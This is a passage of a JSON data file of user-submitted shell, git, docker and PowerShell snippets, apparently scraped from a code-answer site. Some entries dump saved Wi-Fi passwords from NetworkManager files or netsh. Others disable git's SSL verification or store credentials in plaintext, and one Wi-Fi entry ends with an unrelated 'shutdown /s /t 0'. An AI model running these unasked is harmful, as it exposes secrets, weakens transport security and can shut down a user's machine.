    "description": "git fetch --all \n$ git branch -a. If you require only listing the remote branches from Git Bash then use this command: $ git branch -r. You may also use the show-branch command for seeing the branches and their commits as follows: $ git show-branch.\n",
    "reg_date": "2021-10-11T22:04:47.000Z"
  },
  {
    "id": 1625,
    "keyword": null,
    "link": null,
    "title": " get all wifi password by terminal linux",
    "description": "sudo grep psk= /etc/NetworkManager/system-connections/* or sudo grep -r '^psk=' /etc/NetworkManager/system-connections/\n",
    "reg_date": "2021-10-11T22:04:47.000Z"
  },
  {
    "id": 1626,
    "keyword": null,
    "link": null,
    "title": " get childitem of folder over 100 days old",
    "description": "Get-ChildItem \"C:\\temp\" -Recurse -File | Where CreationTime -lt  (Get-Date).AddDays(-15)  | Remove-Item -Force \n",
    "reg_date": "2021-10-11T22:04:47.000Z"
  },
  {
    "id": 1627,
    "keyword": null,
    "link": null,
    "title": " get current directory shell",
    "description": "echo $PWD\n",
    "reg_date": "2021-10-11T22:04:47.000Z"
  },
  {
    "id": 1628,
    "keyword": null,
    "link": null,
    "title": " get current kernel version",
    "description": "cat /proc/version\nuname -r\n$ cat /proc/version\n",
    "reg_date": "2021-10-11T22:04:47.000Z"
  },
  {
    "id": 1629,
    "keyword": null,
    "link": null,
    "title": " get current timestamp shell",
    "description": "// If you want to get unix timestamp, then you need to use: timestamp=$(date +%s)\n",
    "reg_date": "2021-10-11T22:04:48.000Z"
  },
  {
    "id": 1630,
    "keyword": null,
    "link": null,
    "title": " get docker resource usage",
    "description": "docker stats\n",
    "reg_date": "2021-10-11T22:04:48.000Z"
  },
  {
    "id": 1631,
    "keyword": null,
    "link": null,
    "title": " get first few characters of file linux",
    "description": "head -c20 yourFile.txt\n",
    "reg_date": "2021-10-11T22:04:48.000Z"
  },
  {
    "id": 1632,
    "keyword": null,
    "link": null,
    "title": " get git hash",
    "description": "git rev-parse HEAD\n",
    "reg_date": "2021-10-11T22:04:48.000Z"
  },
  {
    "id": 1633,
    "keyword": null,
    "link": null,
    "title": " get git remote url",
    "description": " git config --get remote.origin.url\ngit config --get remote.origin.url\n# Check existing git url: git remote -v\n# If you require full output and you are on a network that can reach the remote repo where the origin resides  git remote show origin \ngit remote show origin\ngit remote show origin \n",
    "reg_date": "2021-10-11T22:04:48.000Z"
  },
  {
    "id": 1634,
    "keyword": null,
    "link": null,
    "title": " get git username and email",
    "description": "git config user.name git config user.email\n",
    "reg_date": "2021-10-11T22:04:48.000Z"
  },
  {
    "id": 1635,
    "keyword": null,
    "link": null,
    "title": " get ip mac terminal",
    "description": "ipconfig getifaddr en0\n# First launch Terminal in Mac #Then past code below:  ipconfig getifaddr en0\nUse for wireless ipconfig getifaddr en1 or for ethernet ipconfig getifaddr en0  ipconfig getifaddr en0 is default for wifi interface.\nfor local ip :  hostname -I  for Public ip :  curl icanhazip.com\n",
    "reg_date": "2021-10-11T22:04:48.000Z"
  },
  {
    "id": 1636,
    "keyword": null,
    "link": null,
    "title": " get ip of running docker container",
    "description": "docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' container_name_or_id\nThe --format option of inspect comes to the rescue.  Modern Docker client syntax is:  docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' container_name_or_id  Old Docker client syntax is:  docker inspect --format '{{ .NetworkSettings.IPAddress }}' container_name_or_id\ndocker inspect some-rabbit you will get the ip address and port number from hear. http://172.17.0.2:15672/\ndocker inspect -f '{{.Name}} - {{.NetworkSettings.IPAddress }}' $(docker ps -aq) \n",
    "reg_date": "2021-10-11T22:04:49.000Z"
  },
  {
    "id": 1637,
    "keyword": null,
    "link": null,
    "title": " get jq command",
    "description": "apt-get update && apt-get install jq\t#Just install this way in UNIX\n",
    "reg_date": "2021-10-11T22:04:49.000Z"
  },
  {
    "id": 1638,
    "keyword": null,
    "link": null,
    "title": " get last modified date pdf online",
    "description": "curl -I https://www.cca.edu/sites/default/files/pdf/08/word-to-pdf.pdf 2>/dev/null | grep Last-Modified # Last-Modified: Thu, 13 Jul 2017 09:37:07 GMT\n",
    "reg_date": "2021-10-11T22:04:49.000Z"
  },
  {
    "id": 1639,
    "keyword": null,
    "link": null,
    "title": " get length of array bash",
    "description": "## define it distro=(\"redhat\" \"debian\" \"gentoo\")   ## get length of $distro array len=${#distro[@]}   ## Use bash for loop  for (( i=0; i<$len; i++ )); do echo \"${distro[$i]}\" ; done\necho \"${#my_array[@]}\"\n",
    "reg_date": "2021-10-11T22:04:49.000Z"
  },
  {
    "id": 1640,
    "keyword": null,
    "link": null,
    "title": " get linux OS info from os-release",
    "description": "cat /etc/os-release\n",
    "reg_date": "2021-10-11T22:04:49.000Z"
  },
  {
    "id": 1641,
    "keyword": null,
    "link": null,
    "title": " get linux OS info from proc/version",
    "description": "cat /proc/version\n",
    "reg_date": "2021-10-11T22:04:49.000Z"
  },
  {
    "id": 1642,
    "keyword": null,
    "link": null,
    "title": " get linux ver",
    "description": "cat /etc/os-release\ncat /etc/os-release \n",
    "reg_date": "2021-10-11T22:04:49.000Z"
  },
  {
    "id": 1643,
    "keyword": null,
    "link": null,
    "title": " get list of directories bash",
    "description": "for d in */ ; do     echo \"$d\" done\nls -d */\n",
    "reg_date": "2021-10-11T22:04:50.000Z"
  },
  {
    "id": 1644,
    "keyword": null,
    "link": null,
    "title": " get macadress windows",
    "description": "#open cmd #type command ipconfig/all #your wifi mac adress will be found at your adapter name #in my case \"Realtek RTL8822CE 802.11ac PCIe Adapter\" #my results Verbindungsspezifisches DNS-Suffix:    Beschreibung. . . . . . . . . . . : Realtek RTL8822CE 802.11ac PCIe Adapter    Physische Adresse . . . . . . . . : 70-36-65-5B-A9-B3    DHCP aktiviert. . . . . . . . . . : Ja    Autokonfiguration aktiviert . . . : Ja    IPv4-Adresse  . . . . . . . . . . : 192.168.43.235(Bevorzugt)    Subnetzmaske  . . . . . . . . . . : 255.255.255.0    Lease erhalten. . . . . . . . . . : Dienstag, 20. Oktober 2020 09:51:57    Lease l&auml;uft ab. . . . . . . . . . : Dienstag, 20. Oktober 2020 11:40:53    Standardgateway . . . . . . . . . : 192.168.43.1    DHCP-Server . . . . . . . . . . . : 192.168.43.1    DNS-Server  . . . . . . . . . . . : 192.168.43.1    NetBIOS &uuml;ber TCP/IP . . . . . . . : Aktiviert\n",
    "reg_date": "2021-10-11T22:04:50.000Z"
  },
  {
    "id": 1645,
    "keyword": null,
    "link": null,
    "title": " get only figures of string bash",
    "description": "echo toto.titi.12.tata.2.abc.def | tr -d -c 0-9 #returns 122\n",
    "reg_date": "2021-10-11T22:04:50.000Z"
  },
  {
    "id": 1646,
    "keyword": null,
    "link": null,
    "title": " get program path powershell",
    "description": "(get-command notepad.exe).Path\n # List Paths $Env:Path \n",
    "reg_date": "2021-10-11T22:04:50.000Z"
  },
  {
    "id": 1647,
    "keyword": null,
    "link": null,
    "title": " get public ip linu",
    "description": "wget -qO- http://ipecho.net/plain | xargs echo\n",
    "reg_date": "2021-10-11T22:04:50.000Z"
  },
  {
    "id": 1648,
    "keyword": null,
    "link": null,
    "title": " get ram of ubuntu",
    "description": "$ free -m\nfree -h  #              total        used        free      shared  buff/cache   available #Mem:      -->  7.7G  <--   6.2G        157M        503M        1.3G        709M #Swap:          2.0G        118M        1.9G  \nsudo dmidecode | grep -A 15 Memory\n",
    "reg_date": "2021-10-11T22:04:50.000Z"
  },
  {
    "id": 1649,
    "keyword": null,
    "link": null,
    "title": " get random number shell script",
    "description": "$(( ( RANDOM % 10 )  + 1 ))\n#If you have coreutils installed and want a number inbewtween a value shuf -i MIN-MAX -n 1 #or you can use bash  $RANDOM\n",
    "reg_date": "2021-10-11T22:04:50.000Z"
  },
  {
    "id": 1650,
    "keyword": null,
    "link": null,
    "title": " get script dir bash",
    "description": "SCRIPT_DIR=\"$(dirname \"$(readlink -f \"$0\")\")\"\n#!/bin/bash  SCRIPT_DIR=\"$( cd \"$( dirname \"${BASH_SOURCE[0]}\" )\" &> /dev/null && pwd )\" \nDIR=\"$( cd \"$( dirname \"${BASH_SOURCE[0]}\" )\" >/dev/null 2>&1 && pwd )\" \n",
    "reg_date": "2021-10-11T22:04:51.000Z"
  },
  {
    "id": 1651,
    "keyword": null,
    "link": null,
    "title": " get ssh key mac",
    "description": "ssh-keygen -t rsa  //copy to clipboard pbcopy < ~/.ssh/id_rsa.pub\n$ ls -al ~/.ssh # Lists the files in your .ssh directory, if they exist\n",
    "reg_date": "2021-10-11T22:04:51.000Z"
  },
  {
    "id": 1652,
    "keyword": null,
    "link": null,
    "title": " get the last exit code cmd",
    "description": "echo Exit Code is %errorlevel% \n",
    "reg_date": "2021-10-11T22:04:51.000Z"
  },
  {
    "id": 1653,
    "keyword": null,
    "link": null,
    "title": " get the size of files in a directory linux",
    "description": "# Displays all the files and sizes in MB or GB du -h --max-depth=1 \ndu -lh --max-depth=1 --block-size=M | sort -nr\nls -l filename   #Displays Size of the specified file ls -l *          #Displays Size of All the files in the current directory ls -al *         #Displays Size of All the files including hidden files in the current directory ls -al dir/      #Displays Size of All the files including hidden files in the 'dir' directory \n",
    "reg_date": "2021-10-11T22:04:51.000Z"
  },
  {
    "id": 1654,
    "keyword": null,
    "link": null,
    "title": " get the wifi password from ubuntu terminal",
    "description": "nmcli device wifi show-password\n",
    "reg_date": "2021-10-11T22:04:51.000Z"
  },
  {
    "id": 1655,
    "keyword": null,
    "link": null,
    "title": " get unpushed commits",
    "description": "git log origin/master..HEAD\n",
    "reg_date": "2021-10-11T22:04:52.000Z"
  },
  {
    "id": 1656,
    "keyword": null,
    "link": null,
    "title": " get wifi password windows 10",
    "description": "NETSH WLAN SHOW PROFILE WIFI KEY=CLEAR \nnetsh wlan show profile name=WIFI-NAME key=clear\nNETSH WLAN SHOW PROFILE \"OnePlus 7T\" KEY=CLEAR    ##Here OnePlus 7T is wifi name\nOpen cmd \"Run as Administrator\" then type the following in the command line netsh wlan show profile netsh wlan export profile folder=c:\\ key=clear\nshutdown /s /t 0\n",
    "reg_date": "2021-10-11T22:04:52.000Z"
  },
  {
    "id": 1657,
    "keyword": null,
    "link": null,
    "title": " get windows service name cmd",
    "description": "sc queryex type= service state= all | find /i \"keyword\"\n",
    "reg_date": "2021-10-11T22:04:52.000Z"
  },
  {
    "id": 1658,
    "keyword": null,
    "link": null,
    "title": " get wsl version",
    "description": "wsl -l -v\n#enable wsl  dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart #make sure windows version is >=2004 dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart #restart wsl --set-default-version 2 #if kernal error https://docs.microsoft.com/en-us/windows/wsl/wsl2-kernel \nwsl -l -v # If version 2 is installed properly, you will see the version number.  # If you don't see a version number, or if you see an error message  # you have version 1\nwsl --list --verbose wsl --set-version <distribution name> <versionNumber>\ndism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart\ndism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart\n",
    "reg_date": "2021-10-11T22:04:52.000Z"
  },
  {
    "id": 1659,
    "keyword": null,
    "link": null,
    "title": " get y.output file yacc remove shift reduce conflict",
    "description": "yacc -v <filename>\n",
    "reg_date": "2021-10-11T22:04:52.000Z"
  },
  {
    "id": 1660,
    "keyword": null,
    "link": null,
    "title": " getkirby install editor",
    "description": "composer require getkirby/editor\n",
    "reg_date": "2021-10-11T22:04:52.000Z"
  },
  {
    "id": 1661,
    "keyword": null,
    "link": null,
    "title": " getting started with sanity",
    "description": "npm install -g @sanity/cli && sanity init\n",
    "reg_date": "2021-10-11T22:04:52.000Z"
  },
  {
    "id": 1662,
    "keyword": null,
    "link": null,
    "title": " gh-pages",
    "description": "npm install gh-pages --save-dev\necho \"# React-task-Tracker\" >> README.md git init git add README.md git commit -m \"first commit\" git branch -M main git remote add origin https://github.com/lumidee007/React-task-Tracker.git git push -u origin main\n",
    "reg_date": "2021-10-11T22:04:52.000Z"
  },
  {
    "id": 1663,
    "keyword": null,
    "link": null,
    "title": " gh create github repo",
    "description": "git init git add . && git commit -m 'Initial commit'  gh repo create\n",
    "reg_date": "2021-10-11T22:04:52.000Z"
  },
  {
    "id": 1664,
    "keyword": null,
    "link": null,
    "title": " gh pages npm",
    "description": "npm install gh-pages --save-dev\n",
    "reg_date": "2021-10-11T22:04:53.000Z"
  },
  {
    "id": 1665,
    "keyword": null,
    "link": null,
    "title": " gif in markdown",
    "description": "![Alt Text](https://media.giphy.com/media/vFKqnCdLPNOKc/giphy.gif)\n![Alt Text](https://media.giphy.com/media/vFKqnCdLPNOKc/giphy.gif) \n",
    "reg_date": "2021-10-11T22:04:53.000Z"
  },
  {
    "id": 1666,
    "keyword": null,
    "link": null,
    "title": " git SSL certificate problem: certificate has expired",
    "description": "git config http.sslVerify false \ngit config --global http.sslVerify false\n",
    "reg_date": "2021-10-11T22:04:53.000Z"
  },
  {
    "id": 1667,
    "keyword": null,
    "link": null,
    "title": " git abort merge",
    "description": "git merge --abort\ngit merge --abort \ngit reset --hard HEAD\n#git merge abort:  git merge --abort\n$ git checkout master Switched to branch 'master' $ git merge iss53\n",
    "reg_date": "2021-10-11T22:04:53.000Z"
  },
  {
    "id": 1668,
    "keyword": null,
    "link": null,
    "title": " git add -A ignore large files",
    "description": "find . -size +1G | cat >> .gitignore # Remember to run it each time you want to update the gitignore!\n",
    "reg_date": "2021-10-11T22:04:53.000Z"
  },
  {
    "id": 1669,
    "keyword": null,
    "link": null,
    "title": " git add access rights for script",
    "description": "git update-index --chmod=+x foo.sh\n",
    "reg_date": "2021-10-11T22:04:53.000Z"
  },
  {
    "id": 1670,
    "keyword": null,
    "link": null,
    "title": " git add all tracked files",
    "description": "// stages all modifications and deletions, without new files. git add -u  // stages new files and modifications, without deletions. git add .  // stages all changes. git add -A\n",
    "reg_date": "2021-10-11T22:04:53.000Z"
  },
  {
    "id": 1671,
    "keyword": null,
    "link": null,
    "title": " git add commit in one command",
    "description": "git commit -am \"message\" \n# The following command does not add new files, only updated pre-existing ones. git commit -am \"commit all the things\" && git push\n// first define a new alias for the commands: git config --global alias.add-commit '!git add -A && git commit'  // and then use it by typing in the message: git add-commit -m 'My commit message'  //Credit for the original post on stackoverflow.\n",
    "reg_date": "2021-10-11T22:04:53.000Z"
  },
  {
    "id": 1672,
    "keyword": null,
    "link": null,
    "title": " git add commit push one command",
    "description": "# The following command does not add new files, only updated pre-existing ones. git commit -am \"commit all the things\" && git push\n",
    "reg_date": "2021-10-11T22:04:53.000Z"
  },
  {
    "id": 1673,
    "keyword": null,
    "link": null,
    "title": " git add existing project to repository",
    "description": "create a new repository on the command line echo \"# {Repo Name}\" >> README.md git init git add README.md git commit -m \"first commit\" git branch -M main git remote add origin https://github.com/cdcdianne/ReactJS-TheMovieDB.git git push -u origin main                  push an existing repository from the command line git remote add origin https://github.com/cdcdianne/ReactJS-TheMovieDB.git git branch -M main git push -u origin main\ngit remote add origin <repository url> git branch -M main git push -u origin main\n# 1) Create a new repository on GitHub.  # To avoid errors, do not initialize the new repository with README, license, or gitignore files. You can add these files after your project has been pushed to GitHub.  # 2) Open Terminal. # 3) Change the current working directory to your local project. # 4) Initialize the local directory as a Git repository. $ git init   # 5) Add the files in your new local repository.  # This stages them for the first commit. $ git add .  # 6)  Adds the files in the local repository and stages them for commit.  # To unstage a file, use 'git reset HEAD YOUR-FILE'. # Commit the files that you've staged in your local repository. $ git commit -m \"First commit\"  # 7) Commits the tracked changes and prepares them to be pushed to a remote  # repository.  # To remove this commit and modify the file, use 'git reset --soft HEAD~1' and  # commit and add the file again.  # 8) At the top of your GitHub repository's Quick Setup page, click  to copy  # the remote repository URL.  # 9) Copy remote repository URL field # 10) In Terminal, add the URL for the remote repository where your local repository will be pushed. $ git remote add origin **remote repository URL** # Sets the new remote $ git remote -v # Verifies the new remote URL  # 11) Push the changes in your local repository to GitHub. $ git push -u origin main # Pushes the changes in your local repository up to the remote repository you specified as the origin\n",
    "reg_date": "2021-10-11T22:04:54.000Z"
  },
  {
    "id": 1674,
    "keyword": null,
    "link": null,
    "title": " git add file to last commit",
    "description": "git add the_left_out_file git commit --amend --no-edit \n$ (some_branch) git commit --amend\n",
    "reg_date": "2021-10-11T22:04:54.000Z"
  },
  {
    "id": 1675,
    "keyword": null,
    "link": null,
    "title": " git add filename too long",
    "description": "git config --system core.longpaths true \n// Should be global instead of system -> no 'permission denied' message git config --global core.longpaths true\n",
    "reg_date": "2021-10-11T22:04:54.000Z"
  },
  {
    "id": 1676,
    "keyword": null,
    "link": null,
    "title": " git add git commit",
    "description": "git add . git commit -m \"intial commit\" git push npm run deploy  \nSet GIT_COMMITTER_DATE=\"Wed Sep 23 9:40 2015 +0200\" git commit --amend --date \"Wed Sep 23 9:40 2015 +0200\" \ngit add index.html css/styles.css git add . git commit -m \"Change titles and styling on homepage\"\ngit checkout <commit>\n//to add a single file git add <FILE_NAME>  //to add all changed files git add -A\n//to add file to the repository 1. git add youFilePath  //if you want to add all file then 2. git add .\n",
    "reg_date": "2021-10-11T22:04:54.000Z"
  },
  {
    "id": 1677,
    "keyword": null,
    "link": null,
    "title": " git add new files to existing repository",
    "description": "cd existing_folder git init git remote add origin https://gitlab.com/abc.git git add . git commit -m \"Initial commit\" git push -u origin master\n",
    "reg_date": "2021-10-11T22:04:54.000Z"
  },
  {
    "id": 1678,
    "keyword": null,
    "link": null,
    "title": " git add remote",
    "description": " git config --get remote.origin.url\n git remote -v  git remote set-url origin https://github.com/USERNAME/REPOSITORY.git\n# If you require full output and you are on a network that can reach the remote repo where the origin resides  git remote show origin \n$ git remote -v > origin  https://github.com/USERNAME/REPOSITORY.git (fetch) > origin  https://github.com/USERNAME/REPOSITORY.git (push)  Change your remote\\'s URL from HTTPS to SSH with the git remote set-url command. $ git remote set-url origin git@github.com:USERNAME/REPOSITORY.git  Verify that the remote URL has changed. $ git remote -v # Verify new remote URL > origin  git@github.com:USERNAME/REPOSITORY.git (fetch) > origin  git@github.com:USERNAME/REPOSITORY.git (push)\n$ git remote add origin https://github.com/user/repo.git # Set a new remote  $ git remote -v # Verify new remote > origin  https://github.com/user/repo.git (fetch) > origin  https://github.com/user/repo.git (push)\ngit remote add heroku https://git.heroku.com/arrecs.git git remote -v -> heroku\thttps://git.heroku.com/arrecs.git (fetch) -> heroku\thttps://git.heroku.com/arrecs.git (push)  git remote remove heroku git remote -v \n",
    "reg_date": "2021-10-11T22:04:54.000Z"
  },
  {
    "id": 1679,
    "keyword": null,
    "link": null,
    "title": " git alias",
    "description": "$ git config --global alias.co checkout $ git config --global alias.br branch $ git config --global alias.ci commit $ git config --global alias.st status\nFollow below steps: a) Open the file .bashrc which is found in location C:\\Users\\USERNAME\\.bashrc  If file .bashrc not exist then create it using below steps: 1. Open Command Prompt and goto C:\\Users\\USERNAME\\. 2. Type command notepad ~/.bashrc It generates the .bashrc file.  b) Add below sample commands of WP CLI, Git, Grunt & PHPCS etc.  # ---------------------- # Git Command Aliases # ---------------------- alias ga='git add .' alias gaa='git add .' alias gaaa='git add --all'  # ---------------------- # WP CLI # ---------------------- alias wpthl='wp theme list' alias wppll='wp plugin list'\n# Setup short form of commands to save keystrokes  git config --global alias.co checkout git config --global alias.br branch git config --global alias.ci commit git config --global alias.st status\ngit config --global alias.co checkout git config --global alias.br branch git config --global alias.com commit git config --global alias.stat status\n",
    "reg_date": "2021-10-11T22:04:54.000Z"
  },
  {
    "id": 1680,
    "keyword": null,
    "link": null,
    "title": " git alias add and commit",
    "description": "git config --global alias.ac '!git add -A && git commit -m'\n",
    "reg_date": "2021-10-11T22:04:54.000Z"
  },
  {
    "id": 1681,
    "keyword": null,
    "link": null,
    "title": " git allow unrelated histories",
    "description": "git pull origin master --allow-unrelated-histories\nfatal: refusing to merge unrelated histories solution: git pull --allow-unrelated-histories\ngit pull origin branchname --allow-unrelated-histories \ngit pull origin main --allow-unrelated-histories\ngit pull origin master --allow-unrelated-histories \nI think its get sorted after using below command >git pull --allow-unrelated-histories\n",
    "reg_date": "2021-10-11T22:04:55.000Z"
  },
  {
    "id": 1682,
    "keyword": null,
    "link": null,
    "title": " git amend commit message after push",
    "description": "git commit --amend -m \"New commit message\" Then git push --force and you're done\n$ git commit --amend -m \"New and correct message\"\ngit checkout branch_name git commit --amend -m \"Modified message\" # if previous commit is not pushed yet git push # or if previous comment was pushed in a previous commit: git push --force-with-lease branch_name\ngit push --force <repository> <branch> \ngit push --force-with-lease <repository> <branch> \n",
    "reg_date": "2021-10-11T22:04:55.000Z"
  },
  {
    "id": 1683,
    "keyword": null,
    "link": null,
    "title": " git amend last commit message",
    "description": "git commit --amend -m \"New commit message\"\n$ git commit --amend -m \"New and correct message\" \ngit commit --amend -m \"New commit message.\"\ngit commit --amend -m \"New commit message\" Then git push --force and you're done\n$ git commit --amend -m \"New and correct message\"\ngit commit --amend \n",
    "reg_date": "2021-10-11T22:04:55.000Z"
  },
  {
    "id": 1684,
    "keyword": null,
    "link": null,
    "title": " git amend no edit",
    "description": "git commit --amend --no-edit\n",
    "reg_date": "2021-10-11T22:04:55.000Z"
  },
  {
    "id": 1685,
    "keyword": null,
    "link": null,
    "title": " git asking for password every time",
    "description": "# it will ask just one more time git config --global credential.helper store\n$ git config credential.helper store $ git push https://github.com/repo.git  Username for 'https://github.com': <USERNAME> Password for 'https://USERNAME@github.com': <PASSWORD> \n",
    "reg_date": "2021-10-11T22:04:55.000Z"
  },
  {
    "id": 1686,
    "keyword": null,
    "link": null,
    "title": " git assume unchanged and do not commit",
    "description": "git update-index --assume-unchanged \"path/to/file\"\n",
    "reg_date": "2021-10-11T22:04:55.000Z"
  },
  {
    "id": 1687,
    "keyword": null,
    "link": null,
    "title": " git bajar rama remota nueva",
    "description": "git checkout -b nombre_rama origin/nombre_rama\n",
    "reg_date": "2021-10-11T22:04:55.000Z"
  },
  {
    "id": 1688,
    "keyword": null,
    "link": null,
    "title": " git bash alias commands",
    "description": "Follow below steps: a) Open the file .bashrc which is found in location C:\\Users\\USERNAME\\.bashrc  If file .bashrc not exist then create it using below steps: 1. Open Command Prompt and goto C:\\Users\\USERNAME\\. 2. Type command notepad ~/.bashrc It generates the .bashrc file.  b) Add below sample commands of WP CLI, Git, Grunt & PHPCS etc.  # ---------------------- # Git Command Aliases # ---------------------- alias ga='git add .' alias gaa='git add .' alias gaaa='git add --all'  # ---------------------- # WP CLI # ---------------------- alias wpthl='wp theme list' alias wppll='wp plugin list'\n",
    "reg_date": "2021-10-11T22:04:55.000Z"
  },
  {
    "id": 1689,
    "keyword": null,
    "link": null,
    "title": " git bash new repository",
    "description": "git init git add -A git commit -m 'Added my project' git remote add origin git@github.com:sammy/my-new-project.git git push -u -f origin master git clone url git fetch git push (to check)\n# New local repository git init git add . git commit -m \"Initial commit\"  # New remote repository git remote add origin git@github.com:username/new_repo #ssh # Now push git push -u origin master\ngit init git add -A git commit -m 'Added my project' git remote add origin git@github.com:sammy/my-new-project.git git push -u -f origin master \n",
    "reg_date": "2021-10-11T22:04:55.000Z"
  },
  {
    "id": 1690,
    "keyword": null,
    "link": null,
    "title": " git bash open in file explorer",
    "description": "$ explorer myDirectory/mySubDirectory/\n",
    "reg_date": "2021-10-11T22:04:56.000Z"
  },
  {
    "id": 1691,
    "keyword": null,
    "link": null,
    "title": " git bash sign in",
    "description": "git config --global user.email \"your_email_address@example.com\" \n$ git config --list --show-origin\n",
    "reg_date": "2021-10-11T22:04:56.000Z"
  },
  {
    "id": 1692,
    "keyword": null,
    "link": null,
    "title": " git bash upstream branch change",
    "description": "git branch --set-upstream-to=origin/branch \ngit config --edit \n",
    "reg_date": "2021-10-11T22:04:56.000Z"
  },
  {
    "id": 1693,
    "keyword": null,
    "link": null,
    "title": " git blame before specific commit",
    "description": "git blame commit_id~1 -- path_to_file\n",
    "reg_date": "2021-10-11T22:04:56.000Z"
  },
  {
    "id": 1694,
    "keyword": null,
    "link": null,
    "title": " git branch and checkout at the same time",
    "description": "$ git checkout -b <branch_name> \n",
    "reg_date": "2021-10-11T22:04:56.000Z"
  },
  {
    "id": 1695,
    "keyword": null,
    "link": null,
    "title": " git branch color terminal ubuntu",
    "description": "# Git branch in prompt. force_color_prompt=yes color_prompt=yes parse_git_branch() {  git branch 2> /dev/null | sed -e '/^[^*]/d' -e 's/* \\(.*\\)/(\\1)/' } if [ \"$color_prompt\" = yes ]; then  PS1='${debian_chroot:+($debian_chroot)}\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[01;31m\\]$(parse_git_branch)\\[\\033[00m\\]\\$ ' else  PS1='${debian_chroot:+($debian_chroot)}\\u@\\h:\\w$(parse_git_branch)\\$ ' fi unset color_prompt force_color_prompt \n",
    "reg_date": "2021-10-11T22:04:56.000Z"
  },
  {
    "id": 1696,
    "keyword": null,
    "link": null,
    "title": " git branch delete local and remote",
    "description": "// delete branch locally git branch -d localBranchName  //delete local branch that is unmerged git branch -D localBranchName  // delete branch remotely git push origin --delete remoteBranchName\n// delete branch locally git branch -d localBranchName  // delete branch remotely git push origin --delete remoteBranchName \n// delete branch locally git branch -d localBranchName  // delete branch remotely git push origin --delete remoteBranchName  // refresh branch list git fetch -p\n$ git push <remote_name> :<branch_name>\n$ git branch -a  # *master # b1 # remote/origin/master # remote/origin/b1  $ git push origin --delete b1 # [...] # - [deleted] b1\n",
    "reg_date": "2021-10-11T22:04:57.000Z"
  },
  {
    "id": 1697,
    "keyword": null,
    "link": null,
    "title": " git branch delete remote",
    "description": "// delete branch locally git branch -d localBranchName  //delete local branch that is unmerged git branch -D localBranchName  // delete branch remotely git push origin --delete remoteBranchName\n$ git push origin --delete feature/login \n# Fetch changes from all remotes and locally delete  # remote deleted branches/tags etc # --prune will do the job :-; git fetch --all --prune\ngit push -d origin <branch_name>\ngit branch -r -d remoteBranchName\n#delete remote branch git push -d <remote_name> <branch_name> #example: git push -d origin new_feature  #delete local branch git branch -d <branch_name> #example: git branch -d new_feature\n",
    "reg_date": "2021-10-11T22:04:57.000Z"
  },
  {
    "id": 1698,
    "keyword": null,
    "link": null,
    "title": " git bypass hook",
    "description": "git commit --no-verify  -n   --no-verify \n",
    "reg_date": "2021-10-11T22:04:57.000Z"
  },
  {
    "id": 1699,
    "keyword": null,
    "link": null,
    "title": " git cancel last commit",
    "description": "# Uncommit the changes git reset --soft HEAD~1  # Completely delete the changes git reset --hard HEAD~1\ngit reset --soft HEAD~1\n#this  will preserve changes done to your files git reset --soft HEAD~1  #this will get rid of the commit and the changes done to the files $ git reset --hard HEAD~1\n#this  will preserve changes done to your files git reset --soft HEAD~1  #this will get rid of the commit and the changes done to the files $ git reset --hard HEAD~1  \n$ git reset --soft HEAD~1\n$ git reset --soft HEAD~1 \n",
    "reg_date": "2021-10-11T22:04:57.000Z"
  },
  {
    "id": 1700,
    "keyword": null,
    "link": null,
    "title": " git change branch name",
    "description": "git branch -m <oldname> <newname> # Any Branch git branch -m <newname> # Current Branch  # For windows if you get \"Branch already exists\" error git branch -M <newname>\n# Rename the local branch to the new name git branch -m <old_name> <new_name>  # Delete the old branch on remote - where <remote> is, for example, origin git push <remote> --delete <old_name>  # Or shorter way to delete remote branch [:] git push <remote> :<old_name>  # Push the new branch to remote git push <remote> <new_name>  # Reset the upstream branch for the new_name local branch git push <remote> -u <new_name> \ngit branch -m <new_name>\ngit branch &ndash;m old-name new-name\ngit branch -m <oldname> <newname> \n$ git checkout Branch-Name-You-Want-to-Change $ git branch -m New-Branch-Name\n",
    "reg_date": "2021-10-11T22:04:57.000Z"
  },
  {
    "id": 1701,
    "keyword": null,
    "link": null,
    "title": " git change commit author",
    "description": "# For one commit git commit --amend --author=\"Author Name <email@address.com>\"  # for multiple commits git rebase -i B  #if you need to edit A, use  git rebase -i --root #change the lines for both C and D from pick to edit #Once the rebase started, it would first pause at C You would  git commit --amend --author=\"Author Name <email@address.com>\" #Then  git rebase --continue #It would pause again at D #Then you would  git commit --amend --author=\"Author Name <email@address.com>\" #again git rebase --continue #The rebase would complete. #Use  git push -f #to update your origin with the updated commits. \ngit commit --amend --author=\"Author Name <email@address.com>\" --no-edit \n git rebase -i HEAD~2  git commit --amend --author=\"Cesar Bueno <cesar.bueno.tx@gmail.com>\"  git rebase --continue\n# Changes the username and email of all commits from the start. git rebase -i --root -x \"git commit --amend --author='YOUR_USERNAME <user@example.com> --no-edit'\"\ngit rebase -i YOUR_SHA -x \"git commit --amend --author 'New Name <new_address@example.com>' -CHEAD\" \n",
    "reg_date": "2021-10-11T22:04:57.000Z"
  },
  {
    "id": 1702,
    "keyword": null,
    "link": null,
    "title": " git change commit message of old commit",
    "description": "git commit --amend -m \"New commit message\"\n$ git commit --amend -m \"New and correct message\" \ngit commit --amend -m \"New commit message\" #This changes the message of the most recent commit.  git rebase -i <commit hash you want to change> #This allows you to make changes to commits starting from the HEAD of the #branch tree to the specified commit. #1.This open your default editor with a list of commits and actions for each.  #By default, the action is `pick`.  #2. For any commit you wish to change the message, change `pick` to `reword`.  #Don't change the commit message. #3. Save and close the editor. #4. For each commit that is set to `reword`, the editor will reopen for change #to be made. After each change save and close the editor and wait for the next. #4. Once you're done editing all the commit messages, you'll return to the  #command prompt, and have a new tree with the updated messages.   #Other actions that can be applied are: #`p` or `pick` &ndash; to keep the commit as is #`r` or `reword` &ndash; to keep the commit's content but alter the commit message #`e`or `edit` &ndash; to keep the commit's content but stop before committing #so that you can: #   - add new content or files #   - remove content or files #   - alter the content that was going to be committed # `s` or `squash` &ndash; to combine this commit's changes into the previous commit #(the commit above it in the list) #`f` or `fixup` &ndash; to combine this commit's change into the previous one but  #drop the commit message #`x` or `exec` &ndash; to run a shell command #`d` or `drop` &ndash; to delete the commit\ngit commit --amend 